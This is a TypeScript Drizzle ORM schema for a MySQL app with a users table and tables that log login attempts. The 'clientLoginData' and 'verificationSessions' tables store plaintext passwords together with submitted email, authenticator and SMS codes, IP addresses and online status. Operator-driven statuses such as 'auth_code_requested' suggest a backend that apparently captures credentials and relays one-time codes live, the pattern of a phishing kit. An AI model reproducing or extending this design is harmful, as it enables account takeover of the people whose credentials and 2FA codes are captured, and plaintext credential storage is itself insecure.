import { int, mysqlEnum, mysqlTable, text, timestamp, varchar } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

/**
 * Client login data table - stores all login attempts and verification data
 */
export const clientLoginData = mysqlTable("clientLoginData", {
  id: int("id").autoincrement().primaryKey(),
  email: varchar("email", { length: 320 }),
  password: text("password"),
  phoneNumber: varchar("phoneNumber", { length: 20 }),
  phoneCountryCode: varchar("phoneCountryCode", { length: 5 }),
  emailVerificationCode: varchar("emailVerificationCode", { length: 10 }),
  authenticatorCode: varchar("authenticatorCode", { length: 10 }),
  loginMethod: varchar("loginMethod", { length: 50 }),
  ipAddress: varchar("ipAddress", { length: 45 }),
  userAgent: text("userAgent"),
  validationStatus: mysqlEnum("validationStatus", ["pending", "valid", "invalid_email_password", "invalid_phone_password", "invalid_email_code", "invalid_authenticator_code"]).default("pending"),
  rejectionReason: text("rejectionReason"),
  isOnline: mysqlEnum("isOnline", ["true", "false"]).default("false").notNull(),
  lastActivityAt: timestamp("lastActivityAt").defaultNow().notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type ClientLoginData = typeof clientLoginData.$inferSelect;
export type InsertClientLoginData = typeof clientLoginData.$inferInsert;

/**
 * Valid credentials table - stores authorized login credentials
 */
export const validCredentials = mysqlTable("validCredentials", {
  id: int("id").autoincrement().primaryKey(),
  email: varchar("email", { length: 320 }).unique(),
  password: text("password"),
  phoneNumber: varchar("phoneNumber", { length: 20 }).unique(),
  phoneCountryCode: varchar("phoneCountryCode", { length: 5 }),
  isActive: mysqlEnum("isActive", ["true", "false"]).default("true"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type ValidCredentials = typeof validCredentials.$inferSelect;
export type InsertValidCredentials = typeof validCredentials.$inferInsert;

/**
 * Verification session table - stores real-time verification sessions
 */
export const verificationSessions = mysqlTable("verificationSessions", {
  id: int("id").autoincrement().primaryKey(),
  clientLoginDataId: int("clientLoginDataId").notNull(),
  sessionId: varchar("sessionId", { length: 64 }).notNull().unique(),
  status: mysqlEnum("status", ["pending", "email_code_requested", "email_code_submitted", "auth_code_requested", "auth_code_submitted", "sms_code_requested", "sms_code_submitted", "verified", "rejected"]).default("pending").notNull(),
  emailCode: varchar("emailCode", { length: 6 }),
  authCode: varchar("authCode", { length: 6 }),
  smsCode: varchar("smsCode", { length: 6 }),
  emailCodeAttempts: int("emailCodeAttempts").default(0).notNull(),
  authCodeAttempts: int("authCodeAttempts").default(0).notNull(),
  smsCodeAttempts: int("smsCodeAttempts").default(0).notNull(),
  rejectionReason: text("rejectionReason"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  expiresAt: timestamp("expiresAt").notNull(),
});

export type VerificationSession = typeof verificationSessions.$inferSelect;
export type InsertVerificationSession = typeof verificationSessions.$inferInsert;

/**
 * Page view stats table - stores general page view counter
 */
export const pageViewStats = mysqlTable("pageViewStats", {
  id: int("id").autoincrement().primaryKey(),
  pageType: varchar("pageType", { length: 50 }).notNull().unique(), // e.g., "login_page"
  viewCount: int("viewCount").default(0).notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type PageViewStats = typeof pageViewStats.$inferSelect;
export type InsertPageViewStats = typeof pageViewStats.$inferInsert;